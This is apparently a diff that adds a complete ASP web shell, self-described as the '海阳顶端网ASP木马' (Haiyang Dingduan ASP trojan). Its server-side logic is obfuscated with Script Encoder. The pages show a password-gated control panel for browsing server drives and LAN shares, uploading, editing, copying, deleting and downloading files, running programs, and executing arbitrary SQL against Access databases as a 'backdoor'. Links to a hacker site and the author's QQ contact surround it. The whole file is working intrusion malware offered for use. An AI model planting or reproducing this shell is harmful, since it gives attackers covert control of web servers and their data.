+<script>javascript:alert("这不是select命令\n请打开数据库看运行结果\n海阳顶端网lcx\n这个你可以当做一个access版sql后门:-)")</script>
+<%#@~^DgAAAA==@#@&+U9Pb0@#@&VAIAAA==^#~@%>
+<form  action="<%=#@~^AwAAAA==;MVUwEAAA==^#~@%>"  method="GET">
+<table border=1>
+   <tr>
+      <td>SQL字符串:</td>
+      <td><Input TYPE="TEXT" NAME="SQL" value="<%=#@~^BgAAAA==dDDj5SSQIAAA==^#~@%>" size ="30">
+  <Input TYPE="TEXT" NAME="mdb" value="acess数据库相对目录及名称" size ="30"></td>
+   </tr>
+   <tr>
+      <td colspan=2 align=center><input TYPE="SUBMIT" value="查询数据库，或执行其它sql语句"></td>
+   </tr>
+</table>
+<hr>
+</form>
+</center>
+
+</body>
+</html>
+<%#@~^TwEAAA==@#@&fj	(zP',I5E/ORwW.hvJYaYr#P,~v目录浏览@#@&k6PcfjUob~@!@*~Jr#~~Dt+U@#@&/nY,d4+s^'k+D7+M mM+CYW8%mYvE/4+V^ CwaVbmCYrG	JbPE建立dtVs对象@#@&/+O~6W[F{d4+s^R	l:/aCm`9?	()b@#@&/OP6WNbOn:k'6W[F rD+h/@#@&0KD~nmmt~^KPrx,WKNrD+s/@#@&DdwKxd+ch.rD+Pr@!0KxY,^GVKD{4sl^V@*J~[,^WcwCO4P[~E ORO E,[~1Wc/k.+,'Pr@!&0KxO@*@!4D@*E@#@&x+XO@#@&x9Pr0@#@&eF4AAA==^#~@%>
+
+<%#@~^TAIAAA==@#@&fj	(zFP{P"n;!+dYcsG.s`JDn6DFJ*~~B目录拷贝，不能进行文件拷贝@#@&G?U()+,'~I5E/O wWDhcrYn6D+r#@#@&k6PfUxo)F@!@*EJ,lU[,f?	pby@!@*rE~Y4+	@#@&/nO,/4+^sF{/n.7+D ^M+CYG(Ln1YvJ/4+^sRmw2VbmCObWxrbPE建立/tss对象@#@&/Y~0G[8'dtsV8RUCs+/2C1+cfUUob+*@#@&0WMPbxVxcfUxp)8#PDGP8P/Dn2P F@#@&r0~hbNcfUU(zFSrBF#xE'J~Y4n	@#@&,P,wlDt{s+6YcfUxp)8~k q#@#@&P,~n6bY,0GD@#@&x[PbW@#@&xnaD@#@&rW,Vnxv2mY4*'yPY4+	~wmY4'alO4,[PrwJ@#@&wmO4 {Dbo4Yc9Uxpb8SVxc9Ux()q*Or#@#@&k+O,0KN {/4nV^F xm:ndalmcwmYt*@#@&/Y,0GNrO:x0K[ cwC.k+xCh`2lD4y#@#@&0KNFcmK2X4+.+,0G[bY+s@#@&M+/aGU/RSDrYn~rmG:sCx9P^GswVnON~/!^1+dk"r@#@&x9~k6@#@&2qUAAA==^#~@%>
+
+<%#@~^TAIAAA==@#@&fj	(z&P{P"n;!+dYcsG.s`JDn6D&J*~~PE目录移动@#@&fjxp)WPxP"n;!+dOcsW.hvJO+XOWJb@#@&b0PG?	pb2@!@*JrPCU9PfUU(zc@!@*EEPDtx@#@&dnDPdtsVy'dnM\+. 1DnlDnK4%mD`JktsVcl2w^k^CDkW	E#,B建立/4nsV对象@#@&k+OPWG9Fx/4nV^  Um:+d2mmn`Gj	()W#@#@&@#@&0K.Pb's+	`9j	(b2bPDWP8~dYw,Oq@#@&r6Phk9cfUxp)2~kSq*'E-r~Dtn	@#@&PP,wmOt{Vn0D`9j	(b2Sk F#@#@&~P,+XkOPWGM@#@&+	[Pb0@#@&	+6O@#@&@#@&k6~^+UvwmYt*'y~Y4+UPalO4{wlD4PLPJ'E@#@&alDt+'.rTtO`GjxobfS^+xc9Uxpb2b kb@#@&k+Y,0K[ {/4+^V+ 	l:dwmm+v2CY4#@#@&d+O~6W[kDn:{0G[yRwC.k+UlsnvwCDty#@#@&0K[Fc:G\tn.P0K[kD+:@#@&.+kwKxd+ AMkO+,EmK:hC	NP^Gsws+Dn9Pd!m1+/k"r@#@&x[Pb0@#@&P6YAAA==^#~@%>
+<%#@~^NAEAAA==@#@&fj	(z*P{P"n;!+dYcsG.s`JDn6D*J*~~P,B执行程序要指定路径@#@&9?Upzv~',]+$EndDRsG.s`EYaDvE*@#@&k0,fUU(z*@!@*rJ~C	NPGjxobv@!@*EJ,Y4+U@#@&dY~/4nV^&xdD\n.cm.+mOW8N+1Y`r/4nV^RCwaVr^mYkKUJ*PB建立k4nV^对象@#@&/4+ss2RUlsn/al^nvf?Upz*bRbO:dckD+:vfUU(zvbRbx-G0+\.4@#@&Dd2W	/RADrOPEmKh:mx[~1W:2sYnN,d!m^/k"J@#@&UN,kW@#@&iFgAAA==^#~@%>
+<center>
+
+<form method="POST" action=""&url&"">
+请输入密码：<input type="password" name="password" size="20">
+<input type="submit" value="确定">
+</center>
+<br><center><a href="http://www.org.ful.cn">【黑客0起点】 http://www.org.ful.cn</a>  <a href="http://wpa.qq.com/msgrd?V=1&Uin=87537111&Site=【欧阳逍遥】作品 0QQ强聊器&Menu=yes">欧阳逍遥 QQ:87537111</a></center></form>
+</body>
+<%#@~^BwAAAA==n	N~kE(oQIAAA==^#~@%>
+<%#@~^dAEAAA==d!4~slbx`*@#@&v修改下面的EMV2lDt改为你服务器的实际i]d@#@&!.ValY4xEtDYa)&zsG1lstKdYr@#@&[b:P^2mY4~^2mY4@#@&k+Y,0kGAMWA/'/.lY64N+mDcE?1DbwOkULcsrVjXkYnh}4Ln^DJb@#@&r6P];!+/D`r2lDtE#{JE~Dt+	@#@&^wlD4xJJJ@#@&nVdn@#@&swmOt{In5!+/OcrwCY4E*[EJJ@#@&+	N,r0@#@&r0,In5!+/DcJmYYMr8J*'rY.EnE,Y4+	@#@&1wCO4'V2CDt@#@&mODDr('rYD!+r@#@&Vd+@#@&^2mYt{j+M\+M \lanmY4`s2mY4#@#@&lDY.r('JE@#@&+UN,r6@#@&W2kAAA==^#~@%><html>
+<script language="JavaScript">
+function crfile(ls)
+{if (ls==""){alert("请输入文件名!");}
+else {window.open("<%=#@~^AwAAAA==;MVUwEAAA==^#~@%>?id=edit&attrib=<%=#@~^EQAAAA==.;;/D`JmYD.k(JbJAYAAA==^#~@%>&creat=yes&path=<%=#@~^BQAAAA==salO4GQIAAA==^#~@%>"+ls);}
+return false;
+}
+function crdir(ls)
+{if (ls==""){alert("请输入文件名!");}
+else {window.open("<%=#@~^AwAAAA==;MVUwEAAA==^#~@%>?id=dir&attrib=<%=#@~^EQAAAA==.;;/D`JmYD.k(JbJAYAAA==^#~@%>&op=creat&path=<%=#@~^BQAAAA==salO4GQIAAA==^#~@%>"+ls);}
+return false;
+}
+</script>
+<script language="vbscript">
+sub rmdir(ls)
+if confirm("你真的要删除这个目录吗!"&Chr(13)&Chr(10)&"目录为："&ls)   then
+window.open("<%=#@~^AwAAAA==;MVUwEAAA==^#~@%>?id=dir&path="&ls&"&op=del&attrib=<%=#@~^EQAAAA==.;;/D`JmYD.k(JbJAYAAA==^#~@%>")
+end if
+end sub
+sub copyfile(sfile)
+dfile=InputBox(""&Chr(13)&Chr(10)&"源文件："&sfile&Chr(13)&Chr(10)&"请输入目标文件的文件名:"&Chr(13)&Chr(10)&"许带路径,要根据你的当前路径模式. 注意:绝对路径示例c:/或c:\都可以")
+dfile=trim(dfile)
+attrib="<%=#@~^EQAAAA==.;;/D`JmYD.k(JbJAYAAA==^#~@%>"
+if dfile<>"" then
+if InStr(dfile,":") or InStr(dfile,"/")=1 then
+lp=""
+if InStr(dfile,":") and attrib<>"true" then
+alert "对不起，你在相对路径模式下不能使用绝对路径"&Chr(13)&Chr(10)&"错误路径：["&dfile&"]"
+exit sub
+end if
+else
+lp="<%=#@~^BQAAAA==salO4GQIAAA==^#~@%>"
+end if
+window.open(""&url&"?id=edit&path="+sfile+"&op=copy&attrib="+attrib+"&dpath="+lp+dfile)
+else
+alert"您没有输入文件名！"
+end If
+end sub
+</script><body bgcolor="#F5F5F5">
+<TABLE cellSpacing=1 cellPadding=3 width="750" align=center
+bgColor=#b8b8b8 border=0>
+<TBODY>
+<TR >
+<TD
+height=22 colspan="4" bgcolor="#eeeeee" >切换盘符：
+<%#@~^qgAAAA==@#@&sGMPAlm4PD4k	o~k	PWdKADKA/RfMr-+k@#@&In/2G	/nRS.kD+~E@!lP4.0xBr'!DsLJQwlDt{E[DtrxTR9.b\+dnYD+DLEl[mYDDr4xOMEnB@*E[DtrUTRf.r7+J+DOD'r盘)@!zl@*P,~P,P~P,PE@#@&12oP@#@&JzEAAA==^#~@%>   &nbsp;本机局域网地址：
+<%#@~^uQAAAA==@#@&?nDPK?mMkaOP{Pj+M\n.cZDCYr4Nn^YvJq?/I(K:RjCAJSr#@#@&U+Y~GUm.kaOg+O,',?+M\.R;DnlD+68N+mDcJq?Z"(KKc1AK	r]Fr#@#@&UnY,Wor^+?zd,'~?.7+.cZM+lD+}8LmO`r?^.bwYbUocsk^njXkY:64%n1YE#@#@&FjoAAA==^#~@%><%=#@~^PAAAAA==~r-wrPLPWUmMrwD1nYcZGhaEY.1m:+,'~J'J,[~Wj^Mk2YgnYcjdnM1lhn,cBMAAA==^#~@%>  </TD>
+</TR>  <TD colspan="4" bgcolor="#ffffff" ><%#@~^AQEAAA==@#@&kW,I;E/DcJmYODb4Eb{JYM;+rPPD4nx@#@&M+dwGUk+ hMrYPE@!mPt.n6'vJL;MV'rB@*@!0KxD~mKVGD{B:9Z!!ZTB@*点击切换到相对路径编辑模式@!z6GUY@*@!Jl@*J@#@&Vd+@#@&D/2G	/+ AMkO+,E@!l~4D0'EJL;D^[EgmYO.b4'D.EB@*@!WGxDP1WsW.xEa9!ZT!ZB@*点击切换到绝对路径编辑模式@!J0WUO@*@!&l@*E@#@&n	N,k0@#@&Kj4AAA==^#~@%>&nbsp路径: <%=#@~^BQAAAA==^alO4EAIAAA==^#~@%>  &nbsp;&nbsp;当前浏览目录:<%=#@~^BQAAAA==salO4GQIAAA==^#~@%></TD></TR> <TR>
+<TD height=22 colspan="4" bgcolor="#eeeeee" >
+<form name="form1" method="post" action="<%=#@~^AwAAAA==;MVUwEAAA==^#~@%>" >
+浏览目录: <input type="text" name="path" size="30" value="c:">
+<input type="hidden" name="attrib" value="true">
+<input type="submit" name="Submit" value="浏览目录" > 〖请使用绝对路径,支持局域网地址！如"\\pc01\c"〗
+</TD></form>
+</TR><TR >
+<TD colspan="4" bgcolor="#ffffff" ><form name="form1" method="post" action="<%=#@~^AwAAAA==;MVUwEAAA==^#~@%>?up=1" enctype="multipart/form-data" >
+<input type="hidden" name="act" value="upload">
+传至服务器已有目录:
+<input name="filepath" type="text" value="drv:\path" size="9">
+文件地址:
+<input type="file" name="file1" value="" size=4><input type="file" name="file2" value="" size=4>
+<input type="file" name="file3" value="" size=4>
+<input type="submit" name="Submit" value="上传" > 〖请用绝对路径〗
+</TD>
+</form></TR>
+<TR bgcolor="#eeeeee">
+<TD colspan="4" >
+</TD> </FORM>
+<script language=vbscript>
+sub send_onclick
+window.open("<%=#@~^AwAAAA==;MVUwEAAA==^#~@%>?run="+userdata.name.value+"&action=执行")
+end sub
+</script>
+<script language=vbscript>
+sub send1_onclick
+window.open("<%=#@~^AwAAAA==;MVUwEAAA==^#~@%>?filename="+userdata.name1.value+"&action=del")
+end sub
+</script>
+</TR>
+<TR bgColor=#ffffff>
+<TD height=22 colspan="4" ><form name="newfile"
+onSubmit="return crfile(newfile.filename.value);">
+<input type="text" name="filename" size="40">
+<input type="submit" value="新建文件" >
+<input type="button" value="新建目录"onclick="crdir(newfile.filename.value)">〖新建文件和新建目录不能同名〗
+</TD></form>
+</TR>
+<TR>
+<TD height=22 width="26%" rowspan="2" valign="top" bgColor=#eeeeee >
+<%#@~^lQIAAA==@#@&NrsPDt+wW^[+M~Ot?;8wWV9nDk@#@&bW~0kW~DGhdncsGV9nDA6rdD/`^2mY4#D4x@#@&?YPDtoW^NnD{0dG~DWSd+cM+DoGV9+M`^wCO4#@#@&UnY,Y4nUE4oG^NnDkxDtnwW^N+MRU;4wWsNDd@#@&I+k2W	/+cA.kD+r@!CP4.0xBr'EMV'EQwlO4{J'I5!+dD`rWV9wmOtr#'JLlOOMk4{E[mYYMr8[rB@*@!WWUO,mGVK.'EaooR!!Tv@*■@!&0KUD@*↑@!6W	YP1W^GD{BW0y ++E@*回上级目录@!JWW	Y@*@!&C@*@!4M@*E@#@&oKD~2m^t,6~(	PY4nUE8sKs9+.k@#@&I+kwKU/RADbYnE@!lP4.+6'Br';D^[rg2lO4{J'VaCY4[a gl:n'r[GV92mY4{JLI+$EdYvJ2lDtEbLJ[mOYMk4{E'lDYMk8[Ev@*└@!WW	OP1WsGM'B:ow%T!Zv@*■@!&6W	Y@*,Pr'6c1C:[E@!Jl@*,@!l,tDWxJLm4Dc&*bLJ%l7C/1Dr2D)P.h9k.`EELV2mY4[6c1mh+LJv#r[^4M`&Wb[r@*@!6GUY,mKVGDxv[so%ZT!EP@*×@!J0WUO@*删除@!&l@*@!(D@*r@#@&1+XY@#@&+	N~k6@#@&fb8AAA==^#~@%>
+</TD>
+<TD  width="45%"  bgColor=#eeeeee>文件名 （鼠标移到文件名可以查看给文件的属性）</TD>
+<TD width="11%" bgColor=#eeeeee>大小（字节）</TD>
+<TD width="18%" bgColor=#eeeeee>文件操作</TD>
+</TR>
+<TR>
+<TD height=200 colspan="3" valign="top" bgColor=#ffffff>
+<%#@~^5AQAAA==@#@&NrsPDt+wk^n/@#@&r0,0dG~DWSd+csW^[nDA6b/O/c^alOt*Otx@#@&U+Y~O4+oW^[Dx6/KADKhknRV+OsKV[nM`maCY4#@#@&jnY,Y4+oksnk'OtoW^Nn.csksnk@#@&IdaWUk+chDbYE@!Dl8VP~AbNY4xB8!!uv~4KD9+.'vTEP^+^s/al^r	o'vTEP^+^sal[9k	o'E E@*J@#@&oWMP3C1tPX~q	PY4nok^+k@#@&kW~"+5EdYvJCODDk8E*'EYM;J~Dtx@#@&/4GhkY.k	oxE@!/YMGxT@*JLa 1m:[E@!&dDDGxT@*J@#@&nsk+@#@&d4WA/D.bxL{J@!lP4DW'EJ'EMV2CDt[^2lDt[X Hls+LJvPOrDVn'EE[r类型J'acYX2nLm4DvqZ#'r属性JL6RzYD.k(EO+k[^4M`FZb[r时间：J[X 9lD+dldY\G9kWk[[rBOCMo+OxE{8VmU0B@*@!/DDW	o@*E[XRHls+'E@!z/D.W	o@*@!&C@*r@#@&+UN~r6@#@&IdwKxdnchDrOJ@!YM@*@!Y[,hbNY4'EX!uB~PkYzs'B(GD9+D 8GYDWs)qPdG^k[P[T!Z!TTpB@*@!WKxOP1G^W.{B[ssR!ZTB@*□@!&0KxO@*r[/4GhkYDbUL[r@!JY[@*@!O9PAk9Ot{B0YEPPdOHVn'E8KD[D 4WDYKh)8PdW^k[~[!!ZT!ZiB@*E'6c/byn[E@!Jl@*@!JON@*@!O[,hk[O4'v ZYEP~kYHV+{B(GD9+.O(WOOK:)8~/KVk9~:!Z!Z!Tiv@*Lx8/aI@!mP4.0'vELE.VLEQk[{+9kYLwmOt{J'ValO4L6RgC:[JLCOYMk('E[CODDr4LEB,YC.T+Yxv|4sl	VEP@*编辑@!zm@*[	4k2i@!l~tM+WxEaB,Gx1Vk1VxmKwH0rVncEJ'VaCY4[a gl:n'rBb@*复制@!&m@*'	4kwi@!l,4D0xBr[;.^[JQrN{+NbO'wmY4'E[s2mY4[X 1m:n'r[W2x9+s[mODDr('r[lDYMr4LJvPDl.LY'Em4^lx0v~@*删除@!zm@*'x8dai@!l,4D0xvr[E.sLJ_k9x9WA	[alY4'r'ValOtL6 Hm:+LE[mYYMr8'r[mYODr8LJvPDCDT+OxE{4sC	3v@*下载@!&m@*'	4kwi@!zD[@*@!zOD@*J@#@&g+6D@#@&xN,rW@#@&I/2WUdRADbO+r@!&Om4Vn@*r@#@&sXEBAA==^#~@%>
+</TD>
+</TR></TBODY>
+</TABLE>
+<%#@~^nwUAAA==~x[,/!4@#@&/!8PNrYv#@#@&b0PMn;!+/DcEWaJ*'ENnsrP~Y4nx@#@&vMCeeMMCeMe删除文件CMCeMCeC@#@&b0,]+$En/D`ECDYDb8J*'JD.;+rPDtnx@#@&Strm4Wk^+x];EndD`EwmO4Jb@#@&V/@#@&Atbm40bVnxk+D7nDc:la2CY4`"+5EndD`EwmOtr#b@#@&+x[~b0@#@&UnDPWkP{PZM+mO+}4%+1YcEUmDb2YbxocorV?H/O+h6(LnmDE#@#@&jnDPY4rk0rV~{PWkRV+Ywk^n`Strm40rs#@#@&Otb/0bsnRG+^+O+~PMEn@#@&]+kwGUk+RA.bYnPr@!(D@*@!mxYD@*删除成功！要刷新才能看到效果 @!JmnxD+.@*r@#@&EMeCeeCMMeC删除文件结束eCeMeMMC@#@&+^d+@#@&rW,D+5;/O`rGaJb{J1WwHJ,Otx@#@&EeMMCeeCMeC复制文件eeCMMeCe@#@&r0~];;+kO`rlOOMk4Eb{JOD!nrPO4+	@#@&Stb^t6ks+{In5!+/DcJalY4Eb@#@&Nk0rVnx"+5EdYvJ[2mYtEb@#@&nVkn@#@&A4k1t0bVx/D-+MRhCawlD4`"+;!ndYvJalOtEb*@#@&NkWk^+xjD\n.cHCwhCDtc"+$E+kYvENalOtr#b@#@&+x9~k6@#@&UnOP6/,'~Z.nmYnr(%+1YcEUmDr2DkUocobVnUXkY+sr(%+1YE#@#@&jnDPY4r/6kV~xP6/cMnYor^+ch4rm40rs#@#@&O4kd0bsR^KwHPNk0bs+@#@&]+kwGUk+RS.kD+Pr@!^+	YD@*@!2@*源文件：r_Atb^t6ksn3J@!&^xO+M@*r@#@&"+kwW	/ hMkO+,J@!^xY.@*@!4D@*目的文件：EQNk0bVn_E@!JmnxDnD@*J@#@&"+/2G	/nRS.bYn,J@!m+	Y.@*@!4.@*复制成功！要刷新才能看到效果e@!&2@*@!z1nxD+D@*E@#@&EeCeMeMMCeM复制文件结束eCMeCeMM@#@&+sd@#@&k6~M+5!+kYR6WMh`rYn6DJbxrJPD4+	@#@&bW~I;!+dYcE1DnlDE#@!@*Ez/J~O4+U@#@&r6P];!+/D`rCYDDr4r#xEDDEEPDt+	@#@&h4k1tWksn{In;!n/D`E2mYtEb@#@&nVkn@#@&A4k1t0bVx/D-+MRhCawlD4`"+;!ndYvJalOtEb*@#@&+	[Pb0@#@&U+Y~WkPxP;.lOr(L+1YvE?1DrwDkULcsk^n?H/Yh64N+1YE#@#@&U+OPD4kk0rsP'~WkR6wU:+aDsbV+vh4rm40rV~~qBPsms/#@#@&^GE	YDx!@#@&Dtr/^rx'O4b/0rsR.+m[mVs@#@&Dtkk0bs+cZsWk+@#@&k+Y,W/{xWD4rxT@#@&+UN~r6@#@&hZYBAA==^#~@%>
+<form method="POST" action=""&url&"?id=edit">
+<input type="hidden" name="attrib" value="<%=#@~^EQAAAA==];;/D`JmYD.k(JbBAYAAA==^#~@%>">
+<br>
+<TABLE cellSpacing=1 cellPadding=3 width="750" align=center
+bgColor=#b8b8b8 border=0>
+<TBODY>
+<TR >
+<TD
+height=22 bgcolor="#eeeeee" ><div align="center">海阳顶端网ASP木马xp.net 逍遥 版文件编辑器</div></TD>
+</TR>
+<TR >
+<TD width="100%"
+height=22 bgcolor="#ffffff" >文件名：
+<input type="text" name="path" size="45"
+value="<%=#@~^DwAAAA==];;/D`JalD4J*KwUAAA==^#~@%>"readonly>
+</TD>
+</TR>
+<TR>
+<TD
+height=22 bgcolor="#eeeeee" > <div align="center">
+<textarea rows="25" name="text" cols="105"><%=#@~^CAAAAA==O4kd^k	+YAMAAA==^#~@%></textarea>
+</div></TD>
+</TR>
+<TR>
+<TD
+height=22 bgcolor="#ffffff" ><div align="center">
+<input type="submit"
+value="提交" name="B1">
+<input type="reset" value="复原" name="B2">
+</div></TD>
+</TR>
+</TABLE>
+</form>
+<%#@~^nwEAAA==n^/n@#@&b0P"+$;+kYcJmYO.b4J*xJDDEE~Y4+	@#@&h4r1tWk^n'"+5;/YcEalOtrb@#@&n^/@#@&Stb^t6ks+{/n.7+DchlawlD4cI;!+dYcEalOtrb#@#@&nU9PkW@#@&?nY,WkPx,ZM+lD+}8LmO`r?^.bwYbUocsk^njXkY:64%n1YE#@#@&?Y~G!Y0rs'W/c/M+CD+:+6Dsbs+vh4k1tWr^+#@#@&W!Y0bsnRqDbYnSrUP]+$;+kYcED+6OE*@#@&W!O6ksR1VWk+@#@&/Y~0k'UGDtk	L@#@&I+k2Gxk+ch.kOn,J@!mUYD@*修改成功！要刷新才能看到效果Z@!zmnUD+.@*r@#@&+U9Pb0@#@&+	[Pb0@#@&x[~b0@#@&nx9P/!8@#@&x9Pr0@#@&uXkAAA==^#~@%>
+<%#@~^lAcAAA==~kE8,NbD`*@#@&r0,Dn;!+dOvJWaE#{JNsEP,Y4+U@#@&vCeMeCMeCeMM删除目录CeeMMCeMeC@#@&kW,I;E/DcJmYODb4Eb{JYM;+rPY4nU@#@&h4k^t[rM']+$;+kYcEalY4E*@#@&+^d@#@&Stbmt9kMx/D-+MRhCawlD4`"+;!ndYvJalOtEb*@#@&+	[Pb0@#@&U+Y~WkPxP;.lOr(L+1YvE?1DrwDkULcsk^n?H/Yh64N+1YE#@#@&6/ fs+D+oG^N+.~Strm4[bDS:D!+@#@&IdwKxd+ch.rD+Pr@!mxY.@*删除成功！要刷新才能看到效果，删除的目录为)@!4@*J'h4r1t[kM'J@!z8@*@!zmnUD+.@*r@#@&BMCeCeeCeCM删除目录结束eCeMeCeMMCeeC@#@&V/@#@&BCeCeMeMMCeM新建目录eCMeCeMMCe@#@&r6P.+$;/OvJKwJ*'r^DlOJ,PO4x@#@&r0,I+$;n/D`rlOY.r(Jb'rOD!+E~Dt+U@#@&h4k149k.{I;E/DcJalOtr#@#@&V/@#@&Stk14[kM'k+.\n.c:CwaCY4`]n$E+dOvJ2lD4r#b@#@&xN,k6@#@&U+OP6/~x,ZDCYr4Nn^YvJUm.k2ObxLRwrV?zdD+:68N+^Yrb@#@&WkR;D+mYoW^NnD,h4r1tNb.@#@&I+k2Gxk+ch.kOn,J@!mUYD@*建立成功！要刷新才能看到效果S建立的目录为=@!4@*ELh4k149k.LJ@!z4@*@!J^+	YnD@*J@#@&EeeCMeCeeCMM新建目录结束eCeCeMeMMC@#@&+	[Pb0@#@&xN~r6@#@&+	[,/;(@#@&BeCeC下载文件@#@&6EUmDkGU,NWSUVKlNwrs+v/DDoksn*@#@&PkODwksn	l:n~{Pd+M-D tlanlDtvdYMsrV#@#@&"+/aGxk+R~;W0D,'~K.;@#@&IdwKxdncZVnCM@#@&?O,/~{PU+D7+M ZM+CYr8%mYvEbGrf~ jYM+m:E#@#@&kR6wU@#@&/ PHw+~x,F@#@&KU,+.MWMPD/!h+,xn6D@#@&jYP6dW,'PUn.\DcZ.+COr8L^YvJj^MkwOr	o sbs?zkY:r(L^Yr#@#@&,kW~	WY,W/KRsbsn2XkkYd`dOMsrVUls+b~Dt+U@#@&P~IdaWUk+cDbYcJ@!tq@*AD.GM)@!J4F@*JPL~dYMsbVnxChP'Pr~NK+d~	WY~nXkdY@!2@*Jb@#@&,PI/aGxk+ 2	N@#@&,+x9~k6@#@&,jnY,0,'~0dGcMnYwrV`dOMsksn	lh+*@#@&Pr	YwkVVUoDt~',0 dby+@#@&/cSWm[oDK:wks+cdDDok^nxm:nb@#@&PrW,+.D,O4+U@#@&,PI/aGxk+ MkOnvJ@!4q@*ADDK.lP@!z4F@*J~',+.Dc9+km.raYkGU,[~J@!2@*Jb@#@&,PI/aGxk+ 2	N@#@&,+x9~k6@#@&,]n/aW	/nR)[9Cnl9nD,J/G	Y+UO fr/aGkkObW	J~,JmOYmm4:xOI,0k^nxm:+{E~[,0cxC:n@#@&P]+k2W	/n zNNunmNnD,E;WUD+	YOd+	LY4JSPbxOobV+^nxTYt@#@&~I/aWU/n ;tCDUnY,'~E`KsR0r@#@&P"nkwG	/RZKxDnxDKzwPx~rlwask1lYbGUzKmD+OOdOM+C:r@#@&,P]nkwWUdR$k	CMX	MkD+PkR"nl9@#@&P"+d2Kx/ s^E/4@#@&PkR;VG/n@#@&Pj+D~/,'~HKYtrUT@#@&PMnkwG	/R+	N@#@&2	N~s!x^ObWx,@#@&6Ex1OrW	PKEO`b~@#@&j+kdkKx )(lx[G	P@#@&MnkwG	/RDNb.+1Y~Jr[/GLJJ,@#@&M+/aGU/Rx[P@#@&Ax[Pw;x1YrG	@#@&giICAA==^#~@%>
+<br>
+<CENTER>警告：对非法使用此程序可能带来的任何不良后果责任自负！海阳顶端网ASP木马XP.NET<br>
+Design By <a href="http://wpa.qq.com/msgrd?V=1&Uin=87537111&Site=【欧阳逍遥】作品 0QQ强聊器&Menu=yes">欧阳逍遥QQ:87537111</a><BR>
+<a href="http://www.org.ful.cn">【黑客0起点】 http://www.org.ful.cn</a></CENTER>
+</body>
+</html>
+
